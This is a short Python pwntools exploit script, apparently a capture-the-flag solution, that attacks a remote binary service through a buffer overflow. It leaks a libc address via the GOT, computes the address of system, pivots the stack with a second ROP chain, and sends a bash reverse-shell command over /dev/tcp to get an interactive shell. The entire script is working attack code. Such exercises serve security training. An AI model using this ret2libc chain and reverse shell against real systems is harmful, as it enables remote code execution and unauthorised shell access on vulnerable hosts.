#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10140)

gets = 0x08048350
puts = 0x08048360
libc_start_main_got = 0x804a018
pop_ebp_ret = 0x804854b
leave_ret = 0x80484e8
buf = 0x0804af80
buf2 = 0x0804a880

rop1 = [
        puts,
        pop_ebp_ret,
        libc_start_main_got,
        gets,
        pop_ebp_ret,
        buf,
        pop_ebp_ret,
        buf - 4,
        leave_ret,
        ]

r.send('A'*22 + ''.join(map(p32,rop1)) + '\n')
r.recvline()

libc = u32(r.recvline()[:4]) - 0x00018650

print 'libc base =', hex(libc)

system = libc + 0x0003acf0

rop2 = [
        gets,
        system,
        buf2,
        buf2
        ]

r.send(''.join(map(p32,rop2)) + '\n')

r.send('bash -c "bash -i >& /dev/tcp/127.0.0.1/31337 0>&1"\n')

r.interactive()
